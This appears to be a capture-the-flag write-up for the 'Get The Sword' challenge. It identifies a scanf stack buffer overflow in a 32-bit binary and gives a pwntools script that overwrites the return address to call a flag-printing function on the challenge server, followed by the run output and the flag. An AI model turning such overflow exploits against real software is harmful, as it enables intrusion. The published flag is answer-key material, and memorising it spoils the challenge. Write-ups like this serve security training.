https://ctftime.org/event/2209/

# Get The Sword

Welcome to the enigmatic realm of identity cards, guarded by a mysterious code. Journey through the shadows and exploit the hidden vulnerabilities within the ID card system.

Connection Information

`nc 173.255.201.51 31337`

## Solution

```
$ file ./get_sword 
./get_sword: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=4a9b260935bf815a04350e3bb9e0e4422f504b2a, for GNU/Linux 4.4.0, not stripped
```

`01922e0f6804b2427bfe622e6af4aaf9bbbc835193eb22511b00f41fc67ee065  ./get_sword`


You can see that the function `intro/0x8049256` has a stack buffer overflow with `scanf` and `%s`. There are 0x20 bytes on the stack before the return address.

You can see that there is a function called `getSword/0x8049218` which `cat`s the flag.

```
from pwn import *

GET_SWORD = 0x08049219

#p = process("./get_sword")
p = remote("173.255.201.51", 31337)
#gdb.attach(p, gdbscript="")

p.readuntil(b"What do you want ? ?: ")

payload = b"A" * 0x20
payload += p32(GET_SWORD)
p.sendline(payload)

p.interactive()
```

```
$ python3 ./go.py 
[+] Opening connection to 173.255.201.51 on port 31337: Done
[*] Switching to interactive mode
KCTF{so_you_g0t_the_sw0rd}
You want, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x19\x04
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to 173.255.201.51 port 31337
```

## Flag
`KCTF{so_you_g0t_the_sw0rd}`
